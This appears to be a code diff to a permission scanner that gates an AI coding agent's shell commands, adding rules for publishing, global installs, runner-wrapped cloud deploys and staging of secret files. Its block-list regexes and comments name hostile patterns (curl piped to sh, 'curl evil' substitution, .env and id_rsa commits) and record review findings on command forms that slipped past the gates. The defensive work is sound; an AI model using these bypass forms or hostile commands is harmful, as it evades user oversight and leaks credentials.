@@ -422,6 +422,9 @@ const DANGEROUS: Array<[RegExp, string]> = [
 const OUTWARD: Array<[RegExp, string]> = [
   [/\b(npm|yarn|pnpm|bun)\s+publish\b/i, "publish a package to the public registry"],
   [/\bdocker\s+push\b/i, "push a Docker image to a registry"],
+  // `expo` is in DEV_TOOLCHAIN but NOT in CLOUD_TOOL, so `expo publish` reached the allowlist with
+  // no veto to catch it (delta review, 2026-08-29). It publishes an app update to Expo's servers.
+  [/\bexpo\s+publish\b/i, "publish an app update to Expo"],
   [/\bvercel\b[^\n]*--prod\b|\bnetlify\s+deploy\b[^\n]*--prod\b|\bfirebase\s+deploy\b|\beas\s+(build|submit)\b|\bfly\s+deploy\b|\bserverless\s+deploy\b|\brailway\s+up\b/i, "deploy to production"],
   [/\b(gcloud|aws|az)\s[^\n]*\b(deploy|apply)\b|\baws\s+s3\s+(sync|cp|rm|mb|rb)\b|\bkubectl\s+apply\b|\bterraform\s+apply\b|\bpulumi\s+up\b|\bhelm\s+(install|upgrade)\b/i, "deploy or change cloud / infrastructure resources"],
   [/\bgh\s+(release\s+create|pr\s+create|repo\s+create)\b/i, "publish something to GitHub"],
@@ -432,6 +435,9 @@ const OUTWARD: Array<[RegExp, string]> = [
 const SYSTEM: Array<[RegExp, string]> = [
   [/\b(npm|pnpm)\s+(i|install|add)\b[^\n]*\s(-g|--global)\b|\byarn\s+global\s+add\b/i, "install software globally on your computer"],
   [/\b(brew|apt|apt-get|gem|cargo|pipx|port)\s+install\b/i, "install system software"],
+  // `deno install` with -g/--global writes an executable onto PATH — a system-class change that the
+  // dev-toolchain allowlist admitted with no veto (delta review, 2026-08-29).
+  [/\bdeno\s+install\b[^\n]*\s(-g|--global)\b/i, "install a global command with deno"],
   [/\b(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh)\b/i, "run a script straight from the internet"],
   [/\bgit\s+config\s+--global\b|\bgit\s+remote\s+(add|set-url|remove|rm)\b/i, "change your git setup (where your code gets sent)"],
   [/(~|\$HOME|\/Users\/[^/\s]+|\/home\/[^/\s]+)\/\.(bashrc|zshrc|bash_profile|zprofile|profile)\b|>\s*\/etc\/|\bcrontab\s+[^-]|\blaunchctl\s+(load|unload|bootstrap)\b|\bsystemctl\s+(enable|start|stop|disable)\b/i, "change your system or startup settings"],
@@ -446,20 +452,36 @@ const CONSEQUENTIAL: Array<{ list: Array<[RegExp, string]>; title: string; skip?
   { list: OUTWARD, title: "Vinci — this reaches the real world", skip: (c, why) => why.startsWith("send data") && LOCALHOST.test(c) },
   { list: SYSTEM, title: "Vinci — this changes your computer" },
 ];
+/** A sentinel operand meaning "this command stages paths this scanner cannot see". Emitted for
+ *  `--pathspec-from-file`, which reads the path list out of a FILE — the paths never appear in the
+ *  command text, so an operand scan is structurally blind to them and would otherwise pass the
+ *  command as carrying no secrets. Any caller using operands as a safety input must treat this as a
+ *  secret: the honest answer to "what is being staged?" here is "unknown", and unknown fails closed. */
+const OPAQUE_PATHSPEC = "\u0000vinci-opaque-pathspec";
+
 /** The file OPERANDS of a local `git add` / `git commit` segment: real path arguments only, with
  *  flags and their values dropped. The commit-message exclusions are the point — `git commit -m "fix
  *  credentials.json parsing"` names a secret-looking file in PROSE and stages nothing, so treating
  *  the message as an operand would refuse a legitimate commit. Uses the SHARED argv parser
  *  (parseLocalGitSegment), like every other git classifier in this file, so `git -C .. commit` and
- *  `git --no-pager add` are parsed here exactly as they are there. */
+ *  `git --no-pager add` are parsed here exactly as they are there — and, since 2026-08-29, that
+ *  parse is now what DECIDES, rather than being computed and then discarded by a text precondition
+ *  that could not see past a global option (see isCommitSecrets). */
 function gitPathOperands(command: string): string[] {
   const operands: string[] = [];
-  const FLAG_WITH_VALUE = /^(?:-m|--message|-F|--file|-C|--reuse-message|--reedit-message|--author|--date|--pathspec-from-file|--cleanup|--gpg-sign|-S)$/;
+  const FLAG_WITH_VALUE = /^(?:-m|--message|-F|--file|-C|--reuse-message|--reedit-message|--author|--date|--cleanup|--gpg-sign|-S)$/;
   for (const segment of shellSegments(command)) {
     const parsed = parseLocalGitSegment(commandBody(segment));
     if (!parsed || (parsed.subcommand !== "add" && parsed.subcommand !== "commit")) continue;
     for (let index = 0; index < parsed.args.length; index += 1) {
       const arg = parsed.args[index];
+      // `--pathspec-from-file[=<file>]` (and the `--pathspec-file-nul` that accompanies it) launder
+      // the path list out of the command entirely. Poison the operand set instead of skipping it.
+      if (/^--pathspec-from-file(?:=|$)/.test(arg)) {
+        operands.push(OPAQUE_PATHSPEC);
+        if (arg === "--pathspec-from-file") index += 1; // separate-word form: skip its value too
+        continue;
+      }
       if (FLAG_WITH_VALUE.test(arg)) {
         index += 1; // skip the flag's value
         continue;
@@ -471,21 +493,35 @@ function gitPathOperands(command: string): string[] {
   return operands;
 }
 
+/** The original text-level secret-name catch, now applied per OPERAND rather than to the whole
+ *  command string. Kept alongside isSensitiveReadPath() because it covers shapes that one does not:
+ *  any `*.pem/key/p12/pfx` and the id_rsa family anywhere in a path. */
+const SECRET_OPERAND = /(^|[\s"'/])\.env\b|\.(pem|key|p12|pfx)\b|\b(id_rsa|id_ed25519|id_ecdsa)\b/i;
+
 // Committing secret files puts them in git history and leaks them once pushed. Confirm.
 //
-// TWO detectors, deliberately. The regex is the original text-level catch (.env, *.pem/key/p12/pfx,
-// id_rsa…). The operand pass closes the gap that adversarial review measured on 2026-08-29: this
-// predicate knew a far NARROWER set of secrets than the same file's isSensitiveReadPath(), so
-// `git add credentials.json`, `.aws/credentials`, `service-account.json`, `.dev.vars`,
-// `terraform.tfvars`, `.kube/config` and `.docker/config.json` were all stageable. That gap was
-// load-bearing once the W2 profile made the unrequested-checkpoint gate a PROCEED: site 5's whole
-// justification is that site 8 still polices the CONTENTS of the commit it allows, and that
-// dependency was simply not true. isSensitiveReadPath is now the single source of truth for "this
-// file holds live credentials", used for reading it and for committing it alike.
+// ONE decision procedure: parse the segment, then judge its path OPERANDS. Two things were wrong
+// before, both found by adversarial review and both fail-open:
+//
+//  1. (2026-08-29, first pass) the predicate knew a far NARROWER secret set than the same file's
+//     isSensitiveReadPath(), so `git add credentials.json`, `.aws/credentials`,
+//     `service-account.json`, `.dev.vars`, `terraform.tfvars`, `.kube/config` and
+//     `.docker/config.json` were all stageable.
+//  2. (2026-08-29, delta review) the fix for (1) was `&&`-gated behind the text precondition
+//     `/\bgit\s+(add|commit)\b/`, which cannot see past a git GLOBAL option. So
+//     `git --no-pager add credentials.json` and `git -C . add credentials.json` were passed through
+//     untouched — the shared parser handled them correctly and the precondition then threw the
+//     result away. The same precondition blinded the original .env/.pem regex too
+//     (`git --no-pager add .env` was uncaught), which was harmless while site 5 blocked and became
+//     load-bearing the moment the W2 profile made the unrequested-checkpoint gate a PROCEED.
+//
+// Both branches now run on the parser's operands, so there is no text precondition left to defeat:
+// a shape either parses as a local add/commit with operands or it does not exist to this predicate.
+// Site 5's PROCEED depends on this being true, so it is stated as one rule with one input.
 const isCommitSecrets = (cmd: string) =>
-  /\bgit\s+(add|commit)\b/i.test(cmd) &&
-  (/(^|[\s"'/])\.env\b|\.(pem|key|p12|pfx)\b|\b(id_rsa|id_ed25519|id_ecdsa)\b/i.test(cmd) ||
-    gitPathOperands(cmd).some((operand) => isSensitiveReadPath(operand)));
+  gitPathOperands(cmd).some(
+    (operand) => operand === OPAQUE_PATHSPEC || SECRET_OPERAND.test(operand) || isSensitiveReadPath(operand),
+  );
 
 // The dominant real-world leak isn't `git add .env` (rare) — it's a BROAD add that sweeps in an
 // un-gitignored .env the user never named: `git add .` / `git add -A` / `git add --all`, or a
@@ -635,15 +671,71 @@ function isDevToolchainSegment(segment: string): boolean {
   return DEV_TOOLCHAIN.test(segmentCommandWord(segment));
 }
 
+// A RUNNER fetches and executes some OTHER tool. `npx wrangler deploy` really runs `wrangler`, but
+// argv[0] is `npx` — so every check keyed on the command word (isCloudDeploySegment, DEV_TOOLCHAIN)
+// silently judges the runner instead of the tool it is about to run.
+const RUNNER_PREFIX = [
+  /^(?:npx|bunx)\b/i,
+  /^(?:npm|pnpm|yarn|bun)\s+(?:dlx|exec|x)\b/i,
+  /^deno\s+(?:run|task)\b/i,
+];
+// Runner options that take a SEPARATE value, which must not be mistaken for the tool being run.
+const RUNNER_FLAG_WITH_VALUE = /^(?:-p|--package|--node-options|-c|--call|--allow-read|--allow-write)$/;
+
+/** The command a runner is about to execute, as a segment that can be re-judged — or null when this
+ *  segment is not a runner (or names no tool after it).
+ *
+ *  Measured 2026-08-29 (delta review): without this, `npx wrangler deploy`, `pnpm dlx wrangler
+ *  deploy`, `npx supabase db push` and `npx heroku ps:scale` all entered the dev-toolchain
+ *  allowlist, because `npx` is itself in DEV_TOOLCHAIN and isCloudDeploySegment only ever saw `npx`.
+ *  `npx vercel --prod` blocked only because OUTWARD happened to text-match `vercel`; there is no
+ *  OUTWARD entry for wrangler, supabase, heroku, doctl or amplify, so the allowlist admitted them
+ *  and neither veto caught them. The comment on isDevToolchainOnlyNetwork claimed a laundered
+ *  command "cannot ride in on it"; that claim was false, which for a permission system is the defect
+ *  regardless of the exposure. Peeling one layer makes the claim true for these forms. */
+function runnerTargetSegment(segment: string): string | null {
+  const body = commandBody(segment);
+  const prefix = RUNNER_PREFIX.map((pattern) => pattern.exec(body)).find((match) => match !== null);
+  if (!prefix) return null;
+  let rest = body.slice(prefix[0].length).trim();
+  while (rest.startsWith("-")) {
+    const flag = /^\S+/.exec(rest)?.[0] ?? "";
+    rest = rest.slice(flag.length).trim();
+    if (flag === "--") break; // everything after `--` is the tool and its own argv
+    if (RUNNER_FLAG_WITH_VALUE.test(flag)) rest = rest.replace(/^\S+\s*/, "");
+  }
+  return rest || null;
+}
+
 /** True when EVERY network-bearing segment is ordinary build tooling: no raw network tool, no cloud
- *  CLI, and no command substitution. Judged on argv[0] per segment — so `curl https://evil/npm` can
- *  never masquerade as a build, and `npm install $(curl evil)` cannot smuggle a command under the
- *  grant. Anything that fails these tests falls back to the normal per-command approval. */
+ *  CLI (including one hidden behind a runner such as `npx <tool>`), and no command substitution.
+ *  Judged on argv[0] per segment — so `curl https://evil/npm` can never masquerade as a build, and
+ *  `npm install $(curl evil)` cannot smuggle a command under the grant. Anything that fails these
+ *  tests falls back to the normal per-command approval.
+ *
+ *  WHAT THIS DOES NOT DO — stated because the previous wording ("a laundered or bundled command
+ *  cannot ride in on it") was measurably false and an untrue claim in a permission system is itself
+ *  a defect. Judging argv[0] is a NAME check, not a capability check:
+ *    • It peels exactly ONE runner layer. `npx npx wrangler deploy`, or a runner form not in
+ *      RUNNER_PREFIX, is judged on the layer this function can see.
+ *    • It cannot see inside what it admits. `npm install`, `npx`, `pip install` and a Gradle build
+ *      run arbitrary package code (postinstall scripts, build plugins) under whatever grant the
+ *      caller then issues. The allowlist bounds WHICH commands get the network, never what they do
+ *      once they have it.
+ *    • It is a name allowlist, so a locally-named `./npm` or a shell function is out of scope here
+ *      and handled by segmentCommandWord's path-stripping only to the extent argv[0] is honest.
+ *  Callers must treat a `true` as "this looks like ordinary build tooling", not as "this is safe". */
 export function isDevToolchainOnlyNetwork(command: string): boolean {
   if (/\$\(|`/.test(command)) return false; // substitution could run anything under the grant
   let sawToolchainNetwork = false;
   for (const segment of shellSegments(command)) {
     if (isCloudDeploySegment(segment)) return false; // cloud deploys keep their per-command prompt
+    // …and a runner may not launder one past that check. This ONLY ever adds a rejection: the
+    // toolchain/network judgement below still runs on the original segment, so `npx tsx script.ts`
+    // and `npx create-react-app app` behave exactly as they do today and the interactive
+    // once-per-session build grant is unchanged for everything except `npx <cloud tool>`.
+    const runnerTarget = runnerTargetSegment(segment);
+    if (runnerTarget !== null && isCloudDeploySegment(runnerTarget)) return false;
     if (isDevToolchainSegment(segment)) {
       if (isShellNetworkCommand(segment)) sawToolchainNetwork = true;
       continue;
